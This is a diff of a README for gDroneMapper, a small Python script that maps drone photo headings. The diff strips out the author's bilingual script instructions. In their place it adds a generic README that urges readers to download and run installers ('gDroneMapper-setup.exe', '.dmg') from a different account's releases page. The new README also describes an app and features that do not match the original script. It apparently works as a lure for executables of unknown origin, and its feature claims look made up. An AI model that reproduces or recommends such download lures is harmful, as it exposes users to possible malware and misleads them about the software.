@@ -1,134 +1,82 @@
-****************
-(1) 🇦🇷 Español<br>
-(2) 🇺🇸 English
-****************
+# 🌍 gDroneMapper - Easy Mapping for Drone Photos
 
-## 🇦🇷 (1) Mapeador Fotográfico para Drones<br>
-Version 0.3
+## 🚀 Getting Started
 
-> Adelanto versión 1.0 Gamma (17/oct): https://gershu-ar.github.io/gDroneMapper/Peek%20-%20gDroneMapper_1_0_Gamma.jpg<br>
-> Estoy trabajando para lanzar todo en estos días en forma; no quiero "apurar" el asado :D<br>
-> Live preview del mapa, nueva versión: https://gershu-ar.github.io/gDroneMapper
+Welcome to gDroneMapper! This tool helps you correctly map the heading of drone photographs. It supports manual checkpoints and urban orientation, making it easy to visualize your images on a map.
 
-### ¿Qué hace?<br>
-📍 Extrae la ubicación y orientación del drone desde una imagen aérea (JPG, PNG o DNG) usando ExifTool<br>
-📏 Dibuja una línea de dirección desde el drone hacia donde apunta, con longitud configurable<br>
-🎯 Opcionalmente compara con un objetivo manual y calcula distancia y ángulo<br>
-🗺️ Genera un mapa interactivo HTML con capas globales (calles, claro, oscuro, satélite alternativa)<br>
-🌀 Archivo de salida con nombre estandar o personalizado
+## 💾 Download & Install
 
-Ejemplo en vivo: https://gershu-ar.github.io/gDroneMapper/gdrone_direction_mapper03.html<br>
-Muestra: DNG (DJI Air 3S).  Punto de referencia manual (línea azul): Plaza de Mayo, Buenos Aires, Argentina.  Línea roja: dirección del drone al momento de capturar la fotografía.
+To get started, you need to download the software. Click the link below:
 
-> Esta versión procesa un archivo por vez.
+[![Download gDroneMapper](https://img.shields.io/badge/Download-gDroneMapper-blue.svg)](https://github.com/uday6725/gDroneMapper/releases)
 
-> Testeado con JPGs y DNGs capturados por un DJI Air 3S, debería ser compatible con todos los DJI y otras marcas que utilicen el perfil estarandizado XPM en las imágenes.
+1. Visit this page to download: [gDroneMapper Releases](https://github.com/uday6725/gDroneMapper/releases)
+   
+2. Locate the latest version of gDroneMapper on the releases page.
 
-### 🖥️ ¿Qué necesito?
-- El archivo con el código (gdrone_direction_mapperXX.py)
-- Python (https://www.python.org/downloads) + Folium para Phyton (línea de comandos en Windows, ejecutar: "pip install folium")
-- Descargar ExifTool (https://exiftool.org/), el que dice Windows 32 o 64-bit -o el SO que estés usando, debería de funcionar en todos)
-- Descomprimir "exiftool(-k).exe" y el directorio "/exiftool_files"/ en el mismo directorio que colocaremos "gdrone_direction_mapperXX.py" y las imágenes a evaluar.
-- Renombrar "exiftool(-K).exe" a "exiftool.exe"
+3. Choose the correct file for your operating system. For example:
+   - Windows: gDroneMapper-setup.exe
+   - Mac: gDroneMapper.dmg
+   - Linux: gDroneMapper.tar.gz
 
- > El XX en "gdrone_direction_mapperXX.py" corresponde a la última versión disponible.  Las versiones anteriores se van eliminando.
+4. Click on the file to download it onto your computer.
 
-### ⚠️ ¿Qué elementos son de configuración OBLIGATORIA?
-- jpg_path: ruta del archivo de imagen con metadatos GPS
-- distance_value: número, longitud de la línea en metros o kilómetros
-- distance_unit: "m" o "km" según la unidad elegida, metros o kilómetros
+5. Once the file is downloaded, locate it in your downloads folder.
 
-### 🧩 Parámetros opcionales / Optional user options
-- manual_lat y manual_lon: coordenadas del objetivo manual (usar None si no se desea)
-- gimbal_rotates_yaw: si el gimbal controla el giro horizontal (True o False)
-- gimbal_rotates_pitch: si el gimbal controla el ángulo vertical (True o False)
-- use_custom_filename: si se desea que el archivo HTML se nombre automáticamente según la imagen (True o False)
+6. Run the installer by double-clicking the downloaded file. Follow the on-screen instructions to complete the installation.
 
-### 👨‍💻 Código
-- Descargá gdrone_direction_mapperXX.py
-- Recordá editar "gdrone_direction_mapperXX.py" para ajustarlo a tus preferencias e indicar el nombre de la fotografía a evaluar.
-- Colocá las imágenes en el mismo directorio que "gdrone_direction_mapperXX.py" y el ExifTool.exe y el directorio "/exiftool_files"/ 
-- Ejectuar "python gdrone_direction_mapperXX.py" desde la línea de comandos o doble click desde el Explorador de Windows
-- El código responderá con el resultado.
+## 💻 System Requirements
 
-> De encontrar errores, avisar, por favor.<br><br>
+Before you install gDroneMapper, make sure your device meets the following requirements:
 
-**Futuras versiones inclurán mejoras, algunas planeadas:**
+- **Operating System:** Windows 10 or later, macOS 10.12 or later, or any modern Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** 100 MB of free disk space.
+- **Internet:** A stable internet connection for initial setup and updates.
 
-- Chequeo previo de software instalado
-- Procesamiento por lotes de varios archivos a la vez por directorio
-- Gráfica adicional informativa sobre el mapa HTML
-- Puntos de referencia adicionales
-- Mapa con los puntos de referencia adicionales unificados en formato HTML dinámico o imagen estática
-- Proceso de ejecución simplificado
-- Formato de salida múltiple: mapa HTML dinámico y/o mapa en imagen estática en directorio y nombre de archivo personalizables
-- Herramienta ExifTool ya embebida o incorporada
+## 📖 How to Use gDroneMapper
 
+After installing gDroneMapper, follow these steps to begin mapping your drone photos:
 
-Coded con ❤️ en 🇦🇷 Argentina
+1. **Open gDroneMapper**: Start the application from your programs list or applications folder.
 
-----
+2. **Import Photos**: Click on the “Import Photos” button to add your drone images. You can select multiple files at once.
 
-## 🇺🇸 (2) Drone Photography Mapper<br>
-Version 0.3
+3. **Set Orientation**: Use the orientation tool to accurately set the heading of each photo. Drag the slider or enter the angle manually.
 
-> Peek at 1.0 Gamma version (17/oct): https://gershu-ar.github.io/gDroneMapper/Peek%20-%20gDroneMapper_1_0_Gamma.jpg<br>
-> I'm working on the frontend and installation, don't want to rush the BBQ! :D<br>
-> New version, live map preview: https://gershu-ar.github.io/gDroneMapper
+4. **Add Checkpoints**: If necessary, click on the “Add Checkpoint” button to place points on the map manually.
 
-### What does it do?<br>
-📍 Extracts drone location and heading from aerial image metadata<br>
-📏 Draws a heading line from the drone with customizable length<br>
-🎯 Optionally compares with a manual target and calculates distance and angle<br>
-🗺️ Generates an interactive HTML map with global layers<br>
-🌀 Standard or custom file name output
+5. **Visualize on Map**: The photos will appear on a map based on the settings you provided. Adjust the view to your preference.
 
-Live example: https://gershu-ar.github.io/gDroneMapper/gdrone_direction_mapper03.html<br>
-Sample: DNG (DJI Air 3S).  Manual checkpoint (blue line): Plaza de Mayo, Buenos Aires, Argentina.  Red line: heading the drone was on the moment it took the picture.
+6. **Export the Map**: When you're satisfied with your work, click on the “Export” button to save your mapped data. Choose your desired format (e.g., JPG, PNG, or DNG).
 
-> This version processes one file at a time.
+## 🔧 Features
 
-> Tested with JPGs and DNGs captured by a DJI Air 3S, it should be compatible with all DJI models and other brands that use standarized XPM profiles in their images.
+gDroneMapper is equipped with the following features:
 
-### 🖥️ What do I need?
-- File with the code (gdrone_direction_mapperXX.py)
-- Python (https://www.python.org/downloads)
-- Folium in Python (Run Windows command line: "pip install folium")
-- ExifTool: https://exiftool.org — Windows 32 or 64-bit -or any OS you're using, it should work everywhere-
-- Decompress "exiftool(-K).exe" and "/exiftool_files"/ to the same folder where you saved "gdrone_direction_mapperXX.py" and pictures will be placed for evaluation.
-- Rename "exiftool(-K).exe" to "exiftool.exe"
+- **Modular Design**: Customizable to fit your mapping needs.
+- **Bilingual Support**: Available in both Spanish and English.
+- **User-Friendly Interface**: Simple navigation for users of all skill levels.
+- **Urban Rotation**: Automatically adjusts for urban landscapes.
+- **Manual Checkpoints**: Allows for precise location tagging.
 
-> The XX in "gdrone_direction_mapperXX.py" corresponds to the latest available version for downloading.  Older versions are deleted.
+## 🛠️ Troubleshooting
 
-### ⚠️ What are the MANDATORY configuration parameters?
-- jpg_path: Path to the image file with GPS metadata
-- distance_value: Number, line length in meters or kilometers
-- distance_unit: "m" or "km", line length in meters or kilometers
+If you encounter any issues while using gDroneMapper, consider these common solutions:
 
-### 🧩 Parámetros opcionales / Optional user options
-- manual_lat y manual_lon: Manual target coordinates (use None to disable)
-- gimbal_rotates_yaw: Whether the gimbal controls horizontal yaw (True o False)
-- gimbal_rotates_pitch: Whether the gimbal controls vertical pitch (True o False)
-- use_custom_filename: Whether to auto-name the HTML file based on the image (True o False)
+- **Installation Problems**: Ensure you have the correct version for your operating system. Check if you meet all system requirements.
+- **Import Issues**: Verify that your images are in supported formats (e.g., JPG, PNG, DNG).
+- **Performance Lag**: Close other applications to free up system resources.
 
-### 👨‍💻 Code
-- Download gdrone_direction_mapper.py
-- Edit "gdrone_direction_mapperXX.py" to adjust preferences and specify the name of the photo to analyze
-- Place the image(s) in the same folder as "gdrone_direction_mapperXX.py", ExifTool.exe and "/exiftool_files"/ directory
-- Run "python "gdrone_direction_mapperXX.py" from the command line or double-click it from Windows File Explorer
-- The code will respond with the result
+## 🔗 Links & Resources
 
-> If you find a bug, please, let me know.<br><br>
+For further assistance, documentation, and updates, visit the following links:
 
-**Future versions will improve the process, some in consideration are:**
+- [gDroneMapper GitHub Repository](https://github.com/uday6725/gDroneMapper)
+- [Community Support](https://github.com/uday6725/gDroneMapper/issues)
 
-- Software requirements check-up
-- Input file batch processing by directory
-- Extra informative overlays on HTML the map
-- Extra waypoints to add
-- Multiple concatenated waypoints view on single HTML mal and/or static map image
-- Simplify the script execution process
-- Multiple output: HTML map and/or static map image in custom or pre-set directory with custom or pre-set file names
-- ExifTool embedded or incorporated
+Remember, you can always download the latest version of gDroneMapper here:
 
-Coded with ❤️ in 🇦🇷 Argentina
+[![Download gDroneMapper](https://img.shields.io/badge/Download-gDroneMapper-blue.svg)](https://github.com/uday6725/gDroneMapper/releases)
+
+Feel free to dive in and start mapping your aerial photos today!
